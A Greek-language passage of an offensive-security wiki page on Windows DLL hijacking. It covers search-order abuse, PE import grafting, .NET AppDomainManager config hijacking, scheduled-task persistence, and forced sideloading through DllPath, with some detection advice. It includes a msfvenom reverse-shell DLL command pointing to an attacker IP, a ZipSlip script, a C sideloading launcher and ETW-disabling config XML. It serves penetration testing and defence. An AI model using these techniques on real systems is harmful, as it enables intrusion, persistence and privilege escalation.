# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Το DLL Hijacking περιλαμβάνει τον χειρισμό μιας έμπιστης εφαρμογής, ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος περιλαμβάνει διάφορες τακτικές, όπως **DLL Spoofing, Injection και Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα και επίτευξη persistence και, λιγότερο συχνά, για privilege escalation. Παρότι εδώ η εστίαση είναι στην κλιμάκωση προνομίων, η μέθοδος hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Συνήθεις τεχνικές

Χρησιμοποιούνται διάφορες μέθοδοι για DLL hijacking, καθεμία με διαφορετική αποτελεσματικότητα ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά με χρήση DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε διαδρομή αναζήτησης που προηγείται της νόμιμης, εκμεταλλευόμενοι τη σειρά αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία κακόβουλου DLL για να το φορτώσει μια εφαρμογή, θεωρώντας ότι πρόκειται για ένα απαιτούμενο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης, όπως το `%PATH%`, ή αρχείων `.exe.manifest` / `.exe.local`, ώστε η εφαρμογή να κατευθυνθεί στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μέθοδος που συχνά συνδέεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε κατάλογο ελεγχόμενο από τον χρήστη, μαζί με την αντιγραμμένη εφαρμογή, κατά τρόπο παρόμοιο με τις τεχνικές Binary Proxy Execution.

Μια εφαρμογή μπορεί επίσης να υλοποιεί τον **δικό της DLL loader**. Μια προνομιούχα διεργασία μπορεί να απαριθμεί έναν θυγατρικό κατάλογο, όπως `Libraries` ή `Plugins`, και να περνά ένα επιλεγμένο DLL σε ένα βοηθητικό πρόγραμμα, ανεξάρτητα από τη συνήθη σειρά αναζήτησης DLL των Windows. Αν ένας άλλος λογαριασμός μπορεί να δημιουργεί αρχεία στον συγκεκριμένο κατάλογο, θεωρήστε το ένδειξη για περαιτέρω έλεγχο: επιβεβαιώστε την ταυτότητα της διεργασίας, το πραγματικό ACL του καταλόγου, τον κανόνα επιλογής αρχείου και αν υπάρχει προσβάσιμη λειτουργία φόρτωσης. Το ότι ένας κατάλογος δίπλα σε ένα εκτελέσιμο αρχείο είναι εγγράψιμος δεν αποδεικνύει ότι η διεργασία φορτώνει DLL από αυτόν.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Το κλασικό side-loading αφήνει το έμπιστο PE αμετάβλητο και υπερισχύει στην επίλυση ονομάτων DLL. Αντίθετα, το **import grafting** τροποποιεί ένα PE που έχει ήδη φορτωθεί από το έμπιστο πρόγραμμα. Ο επιτιθέμενος προσθέτει έναν import descriptor και τις σχετικές εγγραφές lookup/IAT για ένα DLL που ελέγχει. Όταν τα Windows επιλύσουν αναδρομικά αυτήν την εξάρτηση, χαρτογραφούν το πρόσθετο DLL και εκτελούν τον κώδικα αρχικοποίησής του μέσα στην κατά τα άλλα νόμιμη διεργασία. Πρόκειται για τροποποίηση PE στον δίσκο και όχι για την ίδια ενέργεια με την αντικατάσταση ενός δείκτη συνάρτησης στο live IAT με ένα runtime hook.<sup>[[26]](#references)[[27]](#references)</sup>

Το τροποποιημένο PE μπορεί να είναι ένα ενδιάμεσο DLL προμηθευτή και όχι το εκτελέσιμο που εκκινεί ο χρήστης ή το Task Scheduler. Μια επαναχρησιμοποιήσιμη αλυσίδα είναι η εξής:<sup>[[27]](#references)</sup>

1. Αντιγράψτε το νόμιμο εκτελέσιμο και τις εξαρτήσεις του σε έναν κατάλογο που ελέγχει ο επιτιθέμενος.
2. Επιδιορθώστε τις δομές import μιας εξάρτησης ώστε να αναφέρονται στο κακόβουλο DLL, διατηρώντας παράλληλα τα αναμενόμενα exports και τη συνήθη συμπεριφορά της εξάρτησης.
3. Ρυθμίστε ένα autorun ή μια scheduled task ώστε να εκκινεί το νόμιμο εκτελέσιμο. Ο loader χαρτογραφεί την τροποποιημένη εξάρτηση και στη συνέχεια το νέο DLL που έγινε import. Ανατρέξτε στο [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) για την απαρίθμηση εργασιών.
4. Μην εκτελείτε χρονοβόρες εργασίες μέσα στο `DllMain`. Ο loader που παρατηρήθηκε δημιούργησε ένα worker thread και συνέχισε εκεί τη σταδιακή αποκρυπτογράφηση.

Αυτό διαφέρει από έναν συμβιβασμό στην εφοδιαστική αλυσίδα από την πλευρά του προμηθευτή, καθώς το πακέτο του προμηθευτή είναι καθαρό και η τροποποίηση import γίνεται μετά την εγκατάσταση. Κατά τη διαλογή, ελέγξτε κάθε module στον προσωρινά τοποθετημένο κατάλογο και όχι μόνο το host EXE: συγκρίνετε τις λίστες import και τα hashes των εξαρτήσεων με μια γνωστή ως καλή εγκατάσταση, επαληθεύστε τις υπογραφές και διερευνήστε εκτελέσιμα αρχεία προμηθευτών που εκκινούνται από μη αναμενόμενες εγγράψιμες τοποθεσίες, όπως `C:\ProgramData`. Μια scheduled task που δείχνει σε αντιγραμμένο crash reporter ή updater σε τέτοιο κατάλογο αποτελεί ιδιαίτερα χρήσιμο σημείο διερεύνησης.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να φορτωθεί κώδικας του επιτιθέμενου σε μια έμπιστη διεργασία **.NET Framework**. Αν το εκτελέσιμο-στόχος είναι **managed** εφαρμογή, το CLR ελέγχει επίσης ένα **αρχείο ρυθμίσεων εφαρμογής** με όνομα που βασίζεται στο εκτελέσιμο (για παράδειγμα, `Setup.exe.config`). Αυτό το αρχείο μπορεί να ορίσει ένα προσαρμοσμένο **AppDomainManager**. Αν η ρύθμιση παραπέμπει σε assembly που ελέγχει ο επιτιθέμενος και βρίσκεται δίπλα στο EXE, το CLR το φορτώνει **πριν από τη συνήθη διαδρομή εκτέλεσης της εφαρμογής** και εκτελείται μέσα στην έμπιστη διεργασία.<sup>[[24]](#references)</sup>

Σύμφωνα με το σχήμα ρυθμίσεων του .NET Framework της Microsoft, πρέπει να υπάρχουν τόσο τα `<appDomainManagerAssembly>` όσο και `<appDomainManagerType>` για να χρησιμοποιηθεί ο προσαρμοσμένος manager.<sup>[[16]](#references)[[17]](#references)</sup>

Ελάχιστη ρύθμιση:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Ελάχιστος διαχειριστής:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Πρακτικές σημειώσεις:
- Αυτή η τεχνική είναι **ειδική για το .NET Framework**. Βασίζεται στην ανάλυση ρυθμίσεων του CLR, όχι στη σειρά αναζήτησης DLL του Win32.
- Το host πρέπει να είναι πράγματι **managed EXE**. Γρήγορος έλεγχος: `sigcheck -m target.exe`, `corflags target.exe` ή αναζήτηση της **CLR Runtime Header** στα PE metadata.
- Το όνομα του αρχείου ρυθμίσεων πρέπει να αντιστοιχεί ακριβώς στο όνομα του executable (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **υπογεγραμμένα binary της Microsoft ή προμηθευτών**, επειδή το έμπιστο EXE παραμένει ανέπαφο, ενώ το κακόβουλο managed assembly εκτελείται in-process.
- Αν έχετε ήδη έναν εγγράψιμο κατάλογο εγκατάστασης/ενημέρωσης, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως **πρώτο στάδιο**, και στη συνέχεια να ακολουθήσει κλασικό DLL sideloading ή reflective loading για τα επόμενα στάδια.

### AppDomainManager ως downloader + bootstrapper scheduled task

Ένα πρακτικό μοτίβο εισβολής συνδυάζει το έμπιστο managed EXE με ένα κακόβουλο `*.config` και ένα κακόβουλο AppDomainManager DLL που λειτουργεί μόνο ως **μικρός bootstrapper**:<sup>[[25]](#references)</sup>

1. Ο χρήστης εκκινεί ένα υπογεγραμμένο .NET installer ή updater από μια εύλογη τοποθεσία, όπως `%USERPROFILE%\Downloads`.
2. Το παρακείμενο config κάνει το CLR να φορτώσει το assembly του επιτιθέμενου **πριν ξεκινήσει η λογική της νόμιμης εφαρμογής**.
3. Ο κακόβουλος manager εκτελεί έναν **έλεγχο διαδρομής** (για παράδειγμα, συνεχίζει μόνο αν το host EXE εκτελείται από το `Downloads` και επιτρέπει την εκτέλεση του δεύτερου σταδίου μόνο από το `%LOCALAPPDATA%`).
4. Αν ο έλεγχος περάσει, κατεβάζει το πραγματικό payload σε μια διαδρομή εγγράψιμη από τον χρήστη, όπως `%LOCALAPPDATA%\PerfWatson2.exe`, και εγκαθιστά persistence με scheduled task.

Γιατί έχει σημασία αυτή η παραλλαγή:
- Το υπογεγραμμένο host EXE παραμένει ανέπαφο, οπότε η διαλογή που ελέγχει μόνο τα hashes του κύριου binary μπορεί να μην εντοπίσει την παραβίαση.
- Η απλή **anti-analysis βάσει διαδρομής** είναι συνηθισμένη: η μετακίνηση της τριάδας ZIP/EXE/DLL στην επιφάνεια εργασίας, στο Temp ή σε μια διαδρομή sandbox μπορεί σκόπιμα να διακόψει την αλυσίδα.
- Το AppDomainManager DLL του πρώτου σταδίου μπορεί να παραμείνει μικρό και διακριτικό, ενώ το πραγματικό implant λαμβάνεται αργότερα.

Ελάχιστο παράδειγμα persistence που συναντάται συχνά με αυτό το μοτίβο:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Σημειώσεις:
- Το `/rl highest` σημαίνει **το υψηλότερο διαθέσιμο** για τον συγκεκριμένο χρήστη/συνεδρία· από μόνο του δεν εγγυάται κλιμάκωση σε SYSTEM.
- Αυτή η τεχνική συχνά κατατάσσεται καλύτερα ως **εκτέλεση/διατήρηση πρόσβασης μέσω κατάχρησης ρυθμίσεων .NET** παρά ως κλασικό hijacking της σειράς αναζήτησης λόγω DLL που λείπει, παρόλο που οι operators συχνά συνδυάζουν και τις δύο τεχνικές.

Σημεία ελέγχου για τον εντοπισμό:
- Υπογεγραμμένα εκτελέσιμα .NET που εκκινούνται από **διαδρομές εξαγωγής ZIP**, `Downloads`, `%TEMP%` ή άλλους φακέλους στους οποίους μπορεί να γράψει ο χρήστης, μαζί με ένα **συνεγκατεστημένο** `<exe>.config`.
- Νέες προγραμματισμένες εργασίες των οποίων η ενέργεια δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%` ή `Downloads` και των οποίων τα ονόματα μιμούνται προγράμματα ενημέρωσης browser/vendor.
- Βραχύβιες managed διεργασίες bootstrap που κατεβάζουν αμέσως ένα άλλο EXE και μετά εκκινούν το `schtasks.exe`.
- Δείγματα που τερματίζονται πρόωρα, εκτός αν η διαδρομή του εκτελέσιμου αντιστοιχεί σε αναμενόμενο κατάλογο προφίλ χρήστη.

### Hijacking υπάρχουσας προγραμματισμένης εργασίας για επανεκκίνηση της αλυσίδας sideload

Για διατήρηση πρόσβασης, μην ψάχνετε μόνο για **δημιουργία νέας εργασίας**. Ορισμένες ομάδες εισβολής περιμένουν να δημιουργήσει ένα νόμιμο πρόγραμμα εγκατάστασης μια **κανονική εργασία ενημέρωσης** και στη συνέχεια **αλλάζουν την ενέργεια της εργασίας**, ώστε το υπάρχον όνομα, ο δημιουργός και η ενεργοποίηση να παραμένουν οικεία στους αμυνόμενους.

Επαναχρησιμοποιήσιμη ροή εργασίας:
1. Εγκαταστήστε/εκτελέστε το νόμιμο λογισμικό και εντοπίστε την εργασία που δημιουργεί κανονικά.
2. Εξαγάγετε το XML της εργασίας και σημειώστε τις τρέχουσες τιμές των `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Αντικαταστήστε μόνο την ενέργεια, ώστε η εργασία να εκκινεί το **έμπιστο host EXE** από έναν προσωρινό κατάλογο στον οποίο μπορεί να γράψει ο χρήστης· στη συνέχεια αυτό φορτώνει μέσω sideload ή AppDomain το πραγματικό payload.
4. Καταχωρίστε ξανά την ίδια εργασία αντί να δημιουργήσετε ένα νέο, προφανές τεχνούργημα διατήρησης πρόσβασης.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Γιατί είναι πιο stealthy:
- Το όνομα της task μπορεί να φαίνεται νόμιμο (για παράδειγμα, ως updater κάποιου vendor).
- Το εκκινεί η υπηρεσία **Task Scheduler**, οπότε η επικύρωση parent/ancestor συχνά εντοπίζει την αναμενόμενη αλυσίδα εκκίνησης μέσω του scheduler αντί για το `explorer.exe`.
- Οι ομάδες DFIR που αναζητούν μόνο **νέα ονόματα task** μπορεί να μην εντοπίσουν μια task της οποίας η εγγραφή υπήρχε ήδη, αλλά το action δείχνει πλέον στο `%LOCALAPPDATA%`, `%APPDATA%` ή σε άλλη διαδρομή που ελέγχει ο attacker.

Γρήγορα hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Σύγκρινε τα XML του `C:\Windows\System32\Tasks\*` και τα metadata του `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` με ένα baseline.
- Δημιούργησε alert όταν μια **task updater που μοιάζει να ανήκει σε vendor** εκτελείται από **καταλόγους εγγράψιμους από τον χρήστη** ή εκκινεί ένα .NET EXE με ένα `*.config` αρχείο στον ίδιο κατάλογο.

> [!TIP]
> Για μια αλυσίδα βήμα προς βήμα που συνδυάζει HTML staging, AES-CTR configs και .NET implants με DLL sideloading, δες την παρακάτω διαδικασία.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εύρεση DLL που λείπουν

Ο πιο συνηθισμένος τρόπος για να βρεις DLL που λείπουν από ένα σύστημα είναι να εκτελέσεις το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από το sysinternals και να **ορίσεις** τα **παρακάτω 2 φίλτρα**:

![Common Techniques - Εύρεση DLL που λείπουν: Ο πιο συνηθισμένος τρόπος για να βρεις DLL που λείπουν από ένα σύστημα είναι να εκτελέσεις το procmon από το sysinternals και να ορίσεις τα παρακάτω 2 φίλτρα](<../../../images/image (961).png>)

![Common Techniques - Εύρεση DLL που λείπουν: Ο πιο συνηθισμένος τρόπος για να βρεις DLL που λείπουν από ένα σύστημα είναι να εκτελέσεις το procmon από το sysinternals και να ορίσεις τα παρακάτω 2 φίλτρα](<../../../images/image (230).png>)

και να εμφανίσεις μόνο το **File System Activity**:

![Common Techniques - Εύρεση DLL που λείπουν: και να εμφανίσεις μόνο το File System Activity](<../../../images/image (153).png>)

Αν αναζητάς **DLL που λείπουν γενικά**, άφησέ το να εκτελείται για μερικά **δευτερόλεπτα**.\
Αν αναζητάς μια **DLL που λείπει από συγκεκριμένο executable**, όρισε ένα επιπλέον φίλτρο, όπως **"Process Name" "contains" `<exec name>`**, εκτέλεσέ το και σταμάτησε την καταγραφή συμβάντων.<sup>[[9]](#references)</sup>

## Εκμετάλλευση DLL που λείπουν

Για να κλιμακώσεις τα privileges, αναζήτησε μια **DLL που μια privileged διεργασία προσπαθεί να φορτώσει** από μια τοποθεσία στην οποία μπορείς να γράψεις. Αυτό μπορεί να συμβεί όταν ελέγχεις έναν κατάλογο που αναζητείται πριν από τον κατάλογο που περιέχει την αυθεντική DLL ή όταν η DLL που ζητείται δεν υπάρχει και μπορείς να γράψεις σε έναν από τους καταλόγους που αναζητούνται.

### Σειρά αναζήτησης DLL

**Στην** [**τεκμηρίωση της Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείς να βρεις λεπτομέρειες για το πώς φορτώνονται οι DLL.**

Οι **εφαρμογές Windows** αναζητούν DLL ακολουθώντας ένα σύνολο **προκαθορισμένων διαδρομών αναζήτησης**, με συγκεκριμένη σειρά. Το DLL hijacking προκύπτει όταν τοποθετείται στρατηγικά μια κακόβουλη DLL σε έναν από αυτούς τους καταλόγους, ώστε να φορτωθεί πριν από την αυθεντική DLL. Για να αποτραπεί αυτό, η εφαρμογή πρέπει να χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στις DLL που χρειάζεται.

Παρακάτω φαίνεται η **σειρά αναζήτησης DLL σε συστήματα 32-bit**:

1. Ο κατάλογος από τον οποίο φορτώθηκε η εφαρμογή.
2. Ο κατάλογος συστήματος. Χρησιμοποίησε τη συνάρτηση [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να λάβεις τη διαδρομή αυτού του καταλόγου.(_C:\Windows\System32_)
3. Ο κατάλογος συστήματος 16-bit. Δεν υπάρχει συνάρτηση που να επιστρέφει τη διαδρομή αυτού του καταλόγου, αλλά γίνεται αναζήτηση σε αυτόν. (_C:\Windows\System_)
4. Ο κατάλογος Windows. Χρησιμοποίησε τη συνάρτηση [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να λάβεις τη διαδρομή αυτού του καταλόγου.
   1. (_C:\Windows_)
5. Ο τρέχων κατάλογος.
6. Οι κατάλογοι που παρατίθενται στη μεταβλητή περιβάλλοντος PATH. Σημείωσε ότι δεν περιλαμβάνεται η διαδρομή ανά εφαρμογή που καθορίζεται από το κλειδί μητρώου **App Paths**. Το κλειδί **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό της διαδρομής αναζήτησης DLL.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσεις αυτή τη δυνατότητα, δημιούργησε την τιμή μητρώου **SafeDllSearchMode** στο **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και όρισέ την σε 0 (η προεπιλογή είναι ενεργοποιημένη).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά από τον κατάλογο του executable module που φορτώνει η **LoadLibraryEx**.

Τέλος, μια DLL μπορεί να φορτωθεί με απόλυτη διαδρομή αντί με το όνομά της. Σε αυτή την περίπτωση, τα Windows αναζητούν την ίδια τη DLL μόνο σε αυτή τη διαδρομή· οι εξαρτήσεις που ζητούνται με βάση το όνομά τους εξακολουθούν να ακολουθούν την αντίστοιχη σειρά αναζήτησης.

Υπάρχουν και άλλοι τρόποι τροποποίησης της σειράς αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

### Σύνδεση arbitrary file write με missing-DLL hijack

**Σχετική τεχνική:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Χρησιμοποίησε φίλτρα **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξεις τα ονόματα DLL που αναζητά η διεργασία αλλά δεν βρίσκει.<sup>[[14]](#references)</sup>
2. Αν το binary εκτελείται βάσει **schedule/ως service**, η τοποθέτηση μιας DLL με ένα από αυτά τα ονόματα στον **κατάλογο της εφαρμογής** (θέση #1 στη σειρά αναζήτησης) θα την κάνει να φορτωθεί στην επόμενη εκτέλεση. Σε μία περίπτωση .NET scanner, η διεργασία αναζητούσε το `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το αυθεντικό αντίγραφο από το `C:\Program Files\dotnet\fxr\...`.
3. Δημιούργησε ένα payload DLL (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν το primitive σου είναι ένα **ZipSlip-style arbitrary write**, δημιούργησε ένα ZIP του οποίου η εγγραφή διαφεύγει από τον κατάλογο αποσυμπίεσης, ώστε η DLL να καταλήξει στον κατάλογο της εφαρμογής:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Παραδώστε το archive στο παρακολουθούμενο inbox/share· όταν η scheduled task επανεκκινήσει τη διεργασία, αυτή φορτώνει το κακόβουλο DLL και εκτελεί τον κώδικά σας ως service account.

### Εξαναγκασμός sideloading μέσω RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε με ντετερμινιστικό τρόπο τη διαδρομή αναζήτησης DLL μιας νεοδημιουργημένης διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας με τα native API του ntdll. Παρέχοντας εδώ έναν κατάλογο που ελέγχεται από τον attacker, μπορείτε να εξαναγκάσετε μια διεργασία-στόχο που επιλύει ένα εισαγόμενο DLL βάσει ονόματος (χωρίς απόλυτη διαδρομή και χωρίς χρήση των safe loading flags) να φορτώσει ένα κακόβουλο DLL από αυτόν τον κατάλογο.

Βασική ιδέα
- Δημιουργήστε τις παραμέτρους της διεργασίας με το RtlCreateProcessParametersEx και δώστε ένα προσαρμοσμένο DllPath που δείχνει στον φάκελο που ελέγχετε (π.χ. στον κατάλογο όπου βρίσκεται το dropper/unpacker σας).
- Δημιουργήστε τη διεργασία με το RtlCreateUserProcess. Όταν το binary-στόχος επιλύσει ένα DLL βάσει ονόματος, ο loader θα συμβουλευτεί το DllPath που έχει δοθεί κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμη και όταν το κακόβουλο DLL δεν βρίσκεται στον ίδιο κατάλογο με το EXE-στόχο.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη θυγατρική διεργασία που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την τρέχουσα διεργασία.
- Ο στόχος πρέπει να εισάγει ή να φορτώνει με LoadLibrary ένα DLL βάσει ονόματος (χωρίς απόλυτη διαδρομή και χωρίς χρήση των LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και οι hardcoded απόλυτες διαδρομές δεν μπορούν να υποστούν hijacking. Τα forwarded exports και το SxS μπορεί να αλλάξουν την προτεραιότητα.

Ελάχιστο παράδειγμα C (ntdll, wide strings, απλοποιημένος χειρισμός σφαλμάτων):

<details>
<summary>Πλήρες παράδειγμα C: εξαναγκασμός DLL sideloading μέσω RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Παράδειγμα λειτουργικής χρήσης
- Τοποθετήστε ένα κακόβουλο xmllite.dll (που εξάγει τις απαιτούμενες συναρτήσεις ή προωθεί τις κλήσεις στην πραγματική DLL) στον κατάλογο DllPath.
- Εκκινήστε ένα υπογεγραμμένο binary που είναι γνωστό ότι αναζητά το xmllite.dll με το όνομά του, χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και φορτώνει μέσω sideloading τη DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί στην πράξη ως τρόπος δημιουργίας αλυσίδων sideloading πολλών σταδίων: ένας αρχικός launcher αποθέτει ένα helper DLL, το οποίο στη συνέχεια εκκινεί ένα υπογεγραμμένο από τη Microsoft binary που μπορεί να γίνει hijack, με ένα προσαρμοσμένο DllPath, ώστε να εξαναγκάσει τη φόρτωση της DLL του επιτιθέμενου από έναν κατάλογο staging.<sup>[[6]](#references)</sup>


### Hijacking του .NET AppDomainManager μέσω `.exe.config`

Για στόχους **.NET Framework**, το sideloading μπορεί να γίνει **πριν από τη `Main()`**, χωρίς τροποποίηση της μνήμης, μέσω κατάχρησης του παρακείμενου αρχείου **`.exe.config`** της εφαρμογής. Αντί να βασιστεί μόνο στη σειρά αναζήτησης DLL του Win32, ο επιτιθέμενος τοποθετεί ένα νόμιμο .NET EXE δίπλα σε ένα κακόβουλο config και μία ή περισσότερες assemblies που ελέγχει.

Πώς λειτουργεί η αλυσίδα:<sup>[[15]](#references)[[22]](#references)</sup>
1. Το host EXE ξεκινά και το **CLR διαβάζει το `<exe>.config`**.
2. Το config ορίζει τα **`<appDomainManagerAssembly>`** και **`<appDomainManagerType>`**, ώστε το runtime να δημιουργήσει ένα `AppDomainManager` που ελέγχεται από τον επιτιθέμενο.
3. Ο κακόβουλος manager αποκτά **εκτέλεση πριν από τη `Main()`** μέσα στη διεργασία του έμπιστου host.
4. Το ίδιο config μπορεί να αναγκάσει το CLR να επιλύσει πρώτα τις τοπικές assemblies (για παράδειγμα `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) και να αποδυναμώσει την επικύρωση/τηλεμετρία του runtime χωρίς inline patching.

Μοτίβο τύπου campaign (η ακριβής εμφώλευση μπορεί να διαφέρει ανάλογα με την οδηγία / την έκδοση του CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Γιατί είναι χρήσιμο:
